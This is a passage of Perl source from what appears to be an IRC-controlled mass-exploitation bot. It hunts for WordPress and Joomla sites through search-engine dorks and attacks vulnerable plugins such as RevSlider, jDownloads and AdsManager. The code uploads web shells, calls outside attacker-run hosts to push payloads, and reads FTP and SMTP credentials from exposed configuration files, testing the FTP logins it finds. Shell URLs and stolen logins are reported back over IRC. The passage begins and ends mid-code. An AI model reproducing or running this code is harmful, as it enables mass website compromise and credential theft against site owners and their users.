 	my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0, SSL_version => 'TLSv1:!TLSv11:!TLSv12:!SSLv2:!SSLv3'}); 

 	$ua->timeout(10); 

 	$ua->agent($uagent); 

 	my $url    = $_[0]; 

 	my $chan   = $_[1]; 

 	my $site   = $_[2]; 

 	my $engine = $_[3]; 

 	my $nick = $_[4]; 

 	my $action = "revslider_ajax_action"; 

 	my $update_file = "revslider.zip"; 

	my $bypass = "http://".$site."errors.php";

	my $shell = "http://".$site."wp-content/plugins/revslider/temp/update_extract/revslider/.libs.php";

	my $bogex = "http://".$site."wp-content.php";

 	my $exploit = $ua->post("$url", Cookie => "", Content_Type => "form-data", Content => [action => "$action", client_action => "update_plugin", update_file => ["$update_file"]]);

	my $status  = $exploit->as_string;

	if ($status =~ /Wrong update extracted folder/) {

	my $check = &get_content($shell."?bajak"); &get_content($shell."?cpanel"); &get_content($shell."?bogel");

	if ($check =~ /bogel - exploit/ || $check =~ /aanK - exploit/){

	my $safe = ""; 

	my $os   = ""; 

	my $uid  = "";

	if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}

	if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}

	if ($check =~ /uid=(.*?)gid=/){$uid=$1;}

 	my $lari = &get_content($bogex); &get_content($bogex."?cpanel"); 

	if ($lari =~ /bogel - exploit/ || $lari =~ /aanK - exploit/){

	&msg("$admin","$revlogo15,1[15@4$engine15][15@4SheLL15]9 $bogex 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

	&msg("$nick","$revlogo15,1[15@4$engine15][15@4SheLL15]9 $bogex 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

	&msg("$chan","$revlogo15,1[15@4$engine15][15@4SheLL15]9 Target Sent to 4*8 $nick 4* 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&mylove($bypass,$chan,$site,$engine);

 	} else {

	&msg("$admin","$revlogo15,1[15@4$engine15][15@4SheLL15]9 $shell 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

	&msg("$nick","$revlogo15,1[15@4$engine15][15@4SheLL15]9 $shell 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

	&msg("$chan","$revlogo15,1[15@4$engine15][15@4SheLL15]9 Target Sent to 4*8 $nick 4* 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&mylove($bypass,$chan,$site,$engine);

 		} 

 	}

    }

}



sub tiga_xpl() {

 	my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0, SSL_version => 'TLSv1:!TLSv11:!TLSv12:!SSLv2:!SSLv3'}); 

 	$ua->timeout(10); 

 	$ua->agent($uagent); 

 	my $url    = $_[0]; 

 	my $chan   = $_[1]; 

 	my $site   = $_[2]; 

 	my $engine = $_[3]; 

 	my $nick = $_[4]; 

 	my $action = "revolution-slider_ajax_action"; 

 	my $update_file = "revolution-slider.zip"; 

	my $bypass = "http://".$site."errors.php";

	my $shell = "http://".$site."wp-content/plugins/revolution-slider/temp/update_extract/revolution-slider/.libs.php";

	my $bogex = "http://".$site."wp-content.php";

 	my $exploit = $ua->post("$url", Cookie => "", Content_Type => "form-data", Content => [action => "$action", client_action => "update_plugin", update_file => ["$update_file"]]);

	my $status  = $exploit->as_string;

	if ($status =~ /Wrong update extracted folder/) {

	my $check = &get_content($shell."?bajak"); &get_content($shell."?cpanel");&get_content($shell."?bogel"); sleep(3);

	if ($check =~ /bogel - exploit/ || $check =~ /aanK - exploit/){

	my $safe = ""; 

	my $os   = ""; 

	my $uid  = "";

	if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}

	if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}

	if ($check =~ /uid=(.*?)gid=/){$uid=$1;}

 	my $lari = &get_content($bogex); &get_content($bogex."?cpanel"); 

	if ($lari =~ /bogel - exploit/i){

	&msg("$admin","$revlogo15,1[15@4$engine15][15@4SheLL15]9 $bogex 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

	&msg("$nick","$revlogo15,1[15@4$engine15][15@4SheLL15]9 $bogex 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

	&msg("$chan","$revlogo15,1[15@4$engine15][15@4SheLL15]9 Target Sent to 4*8 $nick 4* 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&mylove($bypass,$chan,$site,$engine);

 	} else {

	&msg("$admin","$revlogo15,1[15@4$engine15][15@4SheLL15]9 $shell 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

	&msg("$nick","$revlogo15,1[15@4$engine15][15@4SheLL15]9 $shell 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

	&msg("$chan","$revlogo15,1[15@4$engine15][15@4SheLL15]9 Target Sent to 4*8 $nick 4* 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&mylove($bypass,$chan,$site,$engine);

 		} 

 	}

    }

}



sub empat_xpl() {

 	my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0, SSL_version => 'TLSv1:!TLSv11:!TLSv12:!SSLv2:!SSLv3'}); 

 	$ua->timeout(10); 

 	$ua->agent($uagent); 

 	my $url    = $_[0]; 

 	my $chan   = $_[1]; 

 	my $site   = $_[2]; 

 	my $engine = $_[3]; 

 	my $nick = $_[4]; 

 	my $action = "revslider_ajax_action"; 

 	my $update_file = "revslider.zip"; 

	my $target = &get_content("http://".$site);

	if ($target =~ /\/wp-content\/(.*?)\/style\.css/ig){

	$sempak = $1;

	foreach my $black (@unix) {

	my $bypass = "http://".$site."errors.php";

	my $shell = "http://".$site."wp-content/".$sempak.$black."/revslider/.libs.php";

	my $bogex = "http://".$site."wp-content.php";

 	my $exploit = $ua->post("$url", Cookie => "", Content_Type => "form-data", Content => [action => "$action", client_action => "update_plugin", update_file => ["$update_file"]]);

	my $status  = $exploit->as_string;

	if ($status =~ /Wrong update extracted folder/) {

	my $check = &get_content($shell."?bajak"); &get_content($shell."?cpanel");&get_content($shell."?bogel"); sleep(3);

	if ($check =~ /bogel - exploit/ || $check =~ /aanK - exploit/){

	my $safe = ""; 

	my $os   = ""; 

	my $uid  = "";

	if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}

	if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}

	if ($check =~ /uid=(.*?)gid=/){$uid=$1;}

 	my $lari = &get_content($bogex); &get_content($bogex."?cpanel"); 

	if ($lari =~ /bogel - exploit/i){

	&msg("$admin","$revlogo15,1[15@4$engine15][15@4SheLL15]9 $bogex 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

	&msg("$nick","$revlogo15,1[15@4$engine15][15@4SheLL15]9 $bogex 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

	&msg("$chan","$revlogo15,1[15@4$engine15][15@4SheLL15]9 Target Sent to 4*8 $nick 4* 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&mylove($bypass,$chan,$site,$engine);

 	} else {

	&msg("$admin","$revlogo15,1[15@4$engine15][15@4SheLL15]9 $shell 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

	&msg("$nick","$revlogo15,1[15@4$engine15][15@4SheLL15]9 $shell 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

	&msg("$chan","$revlogo15,1[15@4$engine15][15@4SheLL15]9 Target Sent to 4*8 $nick 4* 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&mylove($bypass,$chan,$site,$engine);

 		} 

 	}

    }

}

}

}



sub limo_xpl() {

 	my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0, SSL_version => 'TLSv1:!TLSv11:!TLSv12:!SSLv2:!SSLv3'}); 

 	$ua->timeout(10); 

 	$ua->agent($uagent); 

 	my $url    = $_[0]; 

 	my $chan   = $_[1]; 

 	my $site   = $_[2]; 

 	my $engine = $_[3]; 

 	my $nick = $_[4]; 

 	my $action = "revslider_ajax_action"; 

 	my $update_file = "revslider.zip"; 

	my $target = &get_content("http://".$site);

	if ($target =~ /\/wp-content\/(.*?)\/style\.css/ig){

	$sempak = $1;

	foreach my $black (@kaca) {

	my $bypass = "http://".$site."errors.php";

	my $shell = "http://".$site."wp-content/".$black."/revslider/.libs.php";

	my $bogex = "http://".$site."wp-content.php";

 	my $exploit = $ua->post("$url", Cookie => "", Content_Type => "form-data", Content => [action => "$action", client_action => "update_plugin", update_file => ["$update_file"]]);

	my $status  = $exploit->as_string;

	if ($status =~ /Wrong update extracted folder/) {

	my $check = &get_content($shell."?bajak"); &get_content($shell."?cpanel");&get_content($shell."?bogel"); sleep(2);

	if ($check =~ /bogel - exploit/ || $check =~ /aanK - exploit/){

	my $safe = ""; 

	my $os   = ""; 

	my $uid  = "";

	if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}

	if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}

	if ($check =~ /uid=(.*?)gid=/){$uid=$1;}

 	my $lari = &get_content($bogex); &get_content($bogex."?cpanel"); 

	if ($lari =~ /bogel - exploit/i){

	&msg("$admin","$revlogo15,1[15@4$engine15][15@4SheLL15]9 $bogex 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

	&msg("$nick","$revlogo15,1[15@4$engine15][15@4SheLL15]9 $bogex 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

	&msg("$chan","$revlogo15,1[15@4$engine15][15@4SheLL15]9 Target Sent to 4*8 $nick 4* 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&mylove($bypass,$chan,$site,$engine);

 	} else {

	&msg("$admin","$revlogo15,1[15@4$engine15][15@4SheLL15]9 $shell 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

	&msg("$nick","$revlogo15,1[15@4$engine15][15@4SheLL15]9 $shell 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

	&msg("$chan","$revlogo15,1[15@4$engine15][15@4SheLL15]9 Target Sent to 4*8 $nick 4* 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&mylove($bypass,$chan,$site,$engine);

 		} 

 	}

    }

}

}

}

	

sub mylove() {

 	my $url    = $_[0]; 

 	my $chan   = $_[1];

 	my $site   = $_[2];

 	my $engine = $_[3];

	my $logo   = $_[4];

	my @print;

	my $target = &get_content($url);

	if ($target =~ /Manage Cookies/i) { 

	&msg("$admin","$bplogo3 $site");

	}

	return @print;

}



sub finder() {

	my $chan = $_[0];

	my $site = $_[1];

	my $engine = $_[2];

	my $nick = $_[3];

	my $logo = $_[4];

 	my $coba = $blackunix."mail.php?url=".$site;

 	my $taik = &get_content($coba);

 	if ($taik =~ /Upload Success/i) { 

	&msg("$chan","$revlogo15,1[15@4$engine15]11 Executing Payloads..1.");

	my $xmlrpc = "http://".$site."wp-xmlrpc.php"; 

 	my $check = &get_content($xmlrpc); 

 	if ($check =~ /recky aka bogel/i) {

 	my $safe = ""; 

	my $os   = ""; 

	my $free  = "";

 	if ($check =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}

	if ($check =~ m/SAFE MODE : (.*?)<\/b><\/font>/) {$safe = $1;}

	if ($check =~ m/OS : (.*?)<br>/) {$os = $1;}

	if ($check =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}

 	&msg("$admin","$revlogo15,1[15@4$engine15][15@4SheLL15]9 $xmlrpc 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&msg("$nick","$revlogo15,1[15@4$engine15][15@4SheLL15]9 $xmlrpc 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&msg("$chan","$revlogo15,1[15@4$engine15][15@4SheLL15]9 Target Sent to 4*8 $nick 4* 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	} 

}

} 



sub finder2() {

	my $chan = $_[0];

	my $site = $_[1];

	my $engine = $_[2];

	my $nick = $_[3];

	my $logo = $_[4];

 	my $coba = $blackunix."mail2.php?url=".$site;

 	my $taik = &get_content($coba);

 	if ($taik =~ /Upload Success/i) { 

	&msg("$chan","$revlogo15,1[15@4$engine15]11 Executing Payloads..2.");

	my $xmlrpc = "http://".$site."wp-xmlrpc.php"; 

 	my $check = &get_content($xmlrpc); 

 	if ($check =~ /recky aka bogel/i) {

 	my $safe = ""; 

	my $os   = ""; 

	my $free  = "";

 	if ($check =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}

	if ($check =~ m/SAFE MODE : (.*?)<\/b><\/font>/) {$safe = $1;}

	if ($check =~ m/OS : (.*?)<br>/) {$os = $1;}

	if ($check =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}

 	&msg("$admin","$revlogo15,1[15@4$engine15][15@4SheLL15]9 $xmlrpc 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&msg("$nick","$revlogo15,1[15@4$engine15][15@4SheLL15]9 $xmlrpc 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&msg("$chan","$revlogo15,1[15@4$engine15][15@4SheLL15]9 Target Sent to 4*8 $nick 4* 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	} 

}

} 



sub finder3() {

	my $chan = $_[0];

	my $site = $_[1];

	my $engine = $_[2];

	my $nick = $_[3];

	my $logo = $_[4];

 	my $coba = $blackunix."mail3.php?url=".$site;

 	my $taik = &get_content($coba);

 	if ($taik =~ /Upload Success/i) { 

	&msg("$chan","$revlogo15,1[15@4$engine15]11 Executing Payloads..3.");

	my $xmlrpc = "http://".$site."wp-xmlrpc.php"; 

 	my $check = &get_content($xmlrpc); 

 	if ($check =~ /recky aka bogel/i) {

 	my $safe = ""; 

	my $os   = ""; 

	my $free  = "";

 	if ($check =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}

	if ($check =~ m/SAFE MODE : (.*?)<\/b><\/font>/) {$safe = $1;}

	if ($check =~ m/OS : (.*?)<br>/) {$os = $1;}

	if ($check =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}

 	&msg("$admin","$revlogo15,1[15@4$engine15][15@4SheLL15]9 $xmlrpc 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&msg("$nick","$revlogo15,1[15@4$engine15][15@4SheLL15]9 $xmlrpc 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&msg("$chan","$revlogo15,1[15@4$engine15][15@4SheLL15]9 Target Sent to 4*8 $nick 4* 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	} 

}

} 

sub mailer() {

	my $chan = $_[0];

	my $site = $_[1];

	my $engine = $_[2];

	my $nick = $_[3];

	my $logo = $_[4];

 	my $coba = $blackunix."mailer.php?url=".$site;

 	my $taik = &get_content($coba);

 	if ($taik =~ /Upload Success/i) { 

	&msg("$chan","$revlogo15,1[15@4$engine15]11 Executing Payloads...");

	my $wplink = "http://".$site."wp-link.php"; 

 	my $check = &get_content($wplink); 

 	if ($check =~ /GIF89a/i) {

 	my $safe = ""; 

	my $os   = ""; 

	my $free  = "";

 	if ($check =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}

	if ($check =~ m/SAFE MODE : (.*?)<\/b><\/font>/) {$safe = $1;}

	if ($check =~ m/OS : (.*?)<br>/) {$os = $1;}

	if ($check =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}

 	&msg("$admin","$revlogo15,1[15@4$engine15][15@4 Mailer Boss 15]9 $wplink 15,1[15@"); 	

 	} 

}

} 

## 

sub cfx_exploit() {

	my $chan = $_[0];

	my $bug = $_[1];

	my $dork = $_[2];

	my $engine = $_[3];

	my $nick = $_[4];

	my $count = 0;

	my @list = &search_engine($chan,$bug,$dork,$engine,$cfxlogo,$nick);

	my $num = scalar(@list);

	if ($num > 0){

		foreach my $site(@list){

		$count++;

		if ($count == $num-1) { &msg("$chan","14I'm Done in 15$engine "); }

		if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {

		foreach my $kontak (@kontakz) {

		my $test = "http://".$site.$kontak."inc/upload.php?folder=/cfg-contactform/upload/&fileext=php";

		my $cek = &cfxexp($test);

 		my $bogex = "";

		if ($cek =~ /filename":"(.*)php/i){ 

 		$bogex = $1;}

		my $xmlrpc = "http://".$site.$kontak."upload/.libs.php";

		my $blickunix = "http://".$site."wp-content.php";

		my $check = &get_content($xmlrpc."?bajak"); 

		if ($check =~ /bogel - exploit/ || $check =~ /aanK - exploit/){

		my $safe = "";

 		my $os = "";

 		my $uid = "";

		if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}

		if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}

		if ($check =~ /uid=(.*?)gid=/){$uid=$1;}

		my $chmod = &get_content($blickunix); 

		if ($chmod =~ /bogel - exploit/i){

		&msg("$admin","$cfxlogo15,1[15@4$engine15][15@4SheLL15]9 $blickunix 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

		&msg("$nick","$cfxlogo15,1[15@4$engine15][15@4SheLL15]9 $blickunix 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

		&msg("$chan","$cfxlogo15,1[15@4$engine15][15@4SheLL15]9 sent to $nick 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

		} else {

		&msg("$admin","$cfxlogo15,1[15@4$engine15][15@4SheLL15]9 $xmlrpc 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

		&msg("$nick","$cfxlogo15,1[15@4$engine15][15@4SheLL15]9 $xmlrpc 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

		&msg("$chan","$cfxlogo15,1[15@4$engine15][15@4SheLL15]9 sent to $nick 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

		}

	}

}

 			} exit; }

    		}

    	}

}



sub cfxexp() {

	my ($url) = @_;

	my $aplod = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0, SSL_version => 'TLSv1:!TLSv11:!TLSv12:!SSLv2:!SSLv3'}); 

	my $res = $aplod->post($url,[ 'Filedata' => [ './myluph.PHP' => '.libs.php']], 'Content-type' => 'form-data');

	my $hasil = $res->content;

	return $hasil;

}



###



sub hdf_exploit() {

    my $chan = $_[0];

    my $bug = $_[1];

    my $dork = $_[2];

    my $engine = $_[3];

    my $nick = $_[4];

	my $count = 0;

	my @list = &search_engine($chan,$bug,$dork,$engine,$hdflogo,$nick);

	my $num = scalar(@list);

	if ($num > 0){

		foreach my $site(@list){

		$count++;

		if ($count == $num-1) { &msg("$chan","14I'm Done in 15$engine "); }

		my $target = "http://".$site.$bug;

		if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {

		my $check = &get_content($target);

		if ($check =~ /class JConfig/) {

		my ($host,$user,$pass);

		$target =~ s/http:\/\///;

		$target =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;

		if ($check =~ m/\$ftp_host = '(.+?)';/i){$host=$1;}

		if ($check =~ m/\$ftp_user = '(.+?)';/i){$user=$1;}

		if ($check =~ m/\$ftp_pass = '(.+?)';/i){$pass=$1;}

		if ($check =~ m/\$smtphost = '(.+?)';/i){$smtphost=$1;}

		if ($check =~ m/\$smtpport = '(.+?)';/i){$smtpport=$1;}

 		if ($check =~ m/\$smtpuser = '(.+?)';/i){$smtpuser=$1;}

		if ($check =~ m/\$smtppass = '(.+?)';/i){$smtppass=$1;}

		if ($host =~ /127.0.0.1/) { $host = $target}

		&msg("$chan","$hdflogo15,1[15@4$engine15]4 Host:3 $host 4| 4User:3 $user 4| 4Pass:3 $pass 15][ 4SmtpHost:3 $smtphost 4| 4SmtpPort:3 $smtpport 4| 4SmtpUser:3 $smtpuser 4| 4SmtpPass:3 $smtppass ");

		if ($user =~ /_/) { my @userz = split("_", $user); $user = $userz[0];}

		my $success = 1;

		use Net::FTP;

		eval {

		my $ftp = Net::FTP->new($host, Debug => 0, Timeout => 6);

		$success = 0 if $ftp->login($user,$pass);

		$ftp->quit;

		};

		if ($success == 0) {

			&msg("$admin","$hdflogo15,1[15@4$engine15]14 FTP4 3ftp://".$host." 4| 4User:3 $user 4| 4Pass:3 $pass 15]9 FVCKED!");

			&msg("$nick","$hdflogo15,1[15@4$engine15]14 FTP4 3ftp://".$host." 4| 4User:3 $user 4| 4Pass:3 $pass 15]9 FVCKED!");

			#&msg("$chan","$hdflogo15,1[15@4$engine15][8 Status Login cPanel 9OK! 15-8 Result Sent to 9ADMIN 15] ");

		}

		 else {

			#&msg("$chan","15,1 [9FTP15] [ 9ftp://".$host." 15] [".$user." : ".$pass."15] 4Denied ");

		 }

		}

	} exit;

}

		}

	}

}

##

sub jdl_exploit() {

	my $chan = $_[0];

	my $bug = $_[1];

	my $dork = $_[2];

	my $engine = $_[3];

	my $nick = $_[4];

	my $count = 0;

	my @list = &search_engine($chan,$bug,$dork,$engine,$jdllogo,$nick);

	my $num = scalar(@list);

	if ($num > 0){

		foreach my $site(@list){

		$count++;

		if ($count == $num-1) { &msg("$chan","14I'm Done in 15$engine "); }

		my $test = "http://".$site.$bug;

		if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {

		my $xmlrpc = "http://".$site."images/jdownloads/screenshots/m.libs.up.php.j";

		my $blockunix = "http://".$site."logs/myluph.php";

		my $smtp1 = "http://".$site."logs/myluph.php?bogel";

		my $smtp2 = "http://".$site."images/jdownloads/screenshots/m.libs.up.php.j?clone";

		my $cz  = &get_content($test); {

 		&down($chan,$site,$engine,$nick,$jdllogo); &down2($chan,$site,$engine,$nick,$jdllogo);

		my $bogex = $bulusukan."jdownloads.php?url=".$site;

		&get_content($bogex); 

		my $check = &get_content($xmlrpc."?clone");  

		if ($check =~ /roin aka cucu/i){

		my $safe = "";

 		my $os = "";

 		my $uid = "";

		if ($check =~ /SAFE_MODE : (.*?)<\/b>/){$safe=$1;}

		if ($check =~ /Uname : (.*?)<\/b>/){$os=$1;}

		if ($check =~ /uid=(.*?)gid=/){$uid=$1;}

		my $chmod = &get_content($blockunix);sleep(1);

		if ($chmod =~ /bogel - exploit/i || $chmod =~ /roin aka cucu/i){

		&msg("$admin","$jdllogo15,1[15@4$engine15][15@4SheLL15]9 ".$blockunix." 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

		&msg("$nick","$jdllogo15,1[15@4$engine15][15@4SheLL15]9 ".$blockunix." 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

		&msg("$chan","$jdllogo15,1[15@4$engine15][15@4SheLL15]9 Target Sent to 4*8 $nick 4* 15,1[15@4$os15][15@4safemode 7:4 $safe15]"); 

 		&smtp($smtp2,$chan,$site,$engine); 

 		&bogex($smtp2,$chan,$site,$engine); 

		} else {

		&msg("$admin","$jdllogo15,1[15@4$engine15][15@4SheLL15]9 ".$xmlrpc." 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

		&msg("$nick","$jdllogo15,1[15@4$engine15][15@4SheLL15]9 ".$xmlrpc." 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

		&msg("$chan","$jdllogo15,1[15@4$engine15][15@4SheLL15]9 Target Sent to 4*8 $nick 4* 15,1[15@4$os15][15@4safemode 7:4 $safe15]"); 

 		&smtp($smtp1,$chan,$site,$engine); 

 		&bogex($smtp1,$chan,$site,$engine); 

		}

	}

} 

 			} exit; }

    		}

    	}

}



sub down() {

	my $chan = $_[0];

	my $site = $_[1];

	my $engine = $_[2];

	my $nick = $_[3];

	my $logo = $_[4];

 	my $coba = $bulusukan."down.php?url=".$site;

 	my $taik = &get_content($coba);

 	if ($taik =~ /Upload Success/i) { 

	my $xmlrpc = "http://".$site."cache/bogel.php"; 

 	my $check = &get_content($xmlrpc); 

 	if ($check =~ /recky aka bogel/i) {

 	my $safe = ""; 

	my $os   = ""; 

	my $free  = "";

 	if ($check =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}

	if ($check =~ m/SAFE MODE : (.*?)<\/b><\/font>/) {$safe = $1;}

	if ($check =~ m/OS : (.*?)<br>/) {$os = $1;}

	if ($check =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}

 	&msg("$admin","$jdllogo15,1[15@4$engine15][15@4SheLL15]9 $xmlrpc 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&msg("$nick","$jdllogo15,1[15@4$engine15][15@4SheLL15]9 $xmlrpc 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&msg("$chan","$jdllogo15,1[15@4$engine15][15@4SheLL15]9 Target Sent to 4*8 $nick 4* 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	} 

 	} 

}





sub down2() {

	my $chan = $_[0];

	my $site = $_[1];

	my $engine = $_[2];

	my $nick = $_[3];

	my $logo = $_[4];

 	my $coba = $bulusukan."down2.php?url=".$site;

 	my $taik = &get_content($coba);

 	if ($taik =~ /Upload Success/i) { 

	my $xmlrpc = "http://".$site."cache/myluph.php"; 

 	my $check = &get_content($xmlrpc);

 	if ($check =~ /recky aka bogel/i) {

 	my $safe = ""; 

	my $os   = ""; 

	my $free  = "";

 	if ($check =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}

	if ($check =~ m/SAFE MODE : (.*?)<\/b><\/font>/) {$safe = $1;}

	if ($check =~ m/OS : (.*?)<br>/) {$os = $1;}

	if ($check =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}

 	&msg("$admin","$jdllogo15,1[15@4$engine15][15@4SheLL15]9 $xmlrpc 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&msg("$nick","$jdllogo15,1[15@4$engine15][15@4SheLL15]9 $xmlrpc 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&msg("$chan","$jdllogo15,1[15@4$engine15][15@4SheLL15]9 Target Sent to 4*8 $nick 4* 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	} 

	}

}





####

sub ads_exploit() {

	my $chan = $_[0];

	my $bug = $_[1];

	my $dork = $_[2];

	my $engine = $_[3];

	my $nick = $_[4];

	my $count = 0;

	my @list = &search_engine($chan,$bug,$dork,$engine,$adslogo,$nick);

	my $num = scalar(@list);

	if ($num > 0){

		foreach my $site(@list){

		$count++;

		if ($count == $num-1) { &msg("$chan","14I'm Done in 15$engine "); }

			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else { 

			my $box = "http://".$site."cache/recky.php"; 

			my $bot  = "http://".$site."cache/metri.php"; 

			my $xmlrpc = "http://".$site."tmp/plupload/myluph.php";

			my $smtpluph = "http://".$site."tmp/plupload/myluph.php?x=spread";

		 	my $recky  = "http://".$site."/index.php?option=com_adsmanager&task=upload&tmpl=component";

 			my $cek  = &get_content($recky);

			if ($cek =~ /jsonrpc/i){ 

 			my $type = $bulusukan."ads.php?url=".$site;

 			my $bgl = &get_content($type); { &adsxp($chan,$site,$engine,$nick,$adslogo); &adsxp2($chan,$site,$engine,$nick,$adslogo); &adsxp3($chan,$site,$engine,$nick,$adslogo); 

 			my $check = &get_content($xmlrpc."?x=spread"); &get_content($xmlrpc."?cpanel"); 

			if ($check =~ /recky aka bogel/) {

 			my $safe = ""; 

			my $os   = ""; 

			my $free  = "";

 			if ($check =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}

			if ($check =~ m/SAFE MODE : (.*?)<\/b><\/font>/) {$safe = $1;}

			if ($check =~ m/OS : (.*?)<br>/) {$os = $1;}

			if ($check =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}

			&msg("$admin","$adslogo15,1[4@15$engine15][4@15SheLL15]9 $xmlrpc 15,1[4@15$os15][4@15safemode 7:7 $safe15]");

			&msg("$nick","$adslogo15,1[4@15$engine15][4@15SheLL15]9 $xmlrpc 15,1[4@15$os15][4@15safemode 7:7 $safe15]");

			&msg("$chan","$adslogo15,1[4@15$engine15][4@15SheLL15]9 Target Sent to 7*8 $nick 7* 15,1[4@15$os15][4@15safemode 7:7 $safe15]"); 

 			&smtp($smtpluph,$chan,$site,$engine); 

		}

	}



} &findx($chan,$site,$engine,$nick,$adslogo); &adsxp4($chan,$site,$engine,$nick,$adslogo); 

			} exit; }

		}

	}

}



sub adsxp() {

	my $chan = $_[0];

	my $site = $_[1];

	my $engine = $_[2];

	my $nick = $_[3];

	my $logo = $_[4];

 	my $xmlrpc = "http://".$site."images/com_adsmanager/ads/uploaded/index.php";

 	my $smtpluph = "http://".$site."images/com_adsmanager/ads/uploaded/index.php?x=spread";

 	my $check = &get_content($xmlrpc."?x=spread");

 	if ($check =~ /recky aka bogel/i) {

 	my $safe = ""; 

	my $os   = ""; 

	my $free  = "";

 	if ($check =~ m/Software : (.*?)<\/u><\/b><\/a><br>/) {$soft = $1;}

	if ($check =~ m/SAFE MODE : (.*?)<\/b><\/font>/) {$safe = $1;}

	if ($check =~ m/OS : (.*?)<br>/) {$os = $1;}

	if ($check =~ m/Freespace : (.*?)<\/p><\/td><\/tr>/) {$free = $1;}

 	&msg("$admin","$adslogo15,1[15@4$engine15][15@4SheLL15]9 $xmlrpc 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&msg("$nick","$adslogo15,1[15@4$engine15][15@4SheLL15]9 $xmlrpc 15,1[15@4$os15][15@4safemode 7:4 $safe15]");

 	&msg("$chan","$adslogo15,1[15@4$engine15][15@4SheLL15]9 Target Sent to 4*8 $nick 4* 15,1[15@4$os15][15@4safemode 7:4 $safe15]"); 

 	&smtp($smtpluph,$chan,$site,$engine); 

 	} 

}

##



sub adsxp2() {

	my $chan = $_[0];

	my $site = $_[1];

	my $engine = $_[2];

	my $nick = $_[3];

	my $logo = $_[4];

 	my $coba = $bulusukan."wew.php?url=".$site;

 	my $taik = &get_content($coba);

 	if ($taik =~ /Aplod Berhasil/i) { 

	my $xmlrpc = "http://".$site."includes/xmlrpc.php"; 

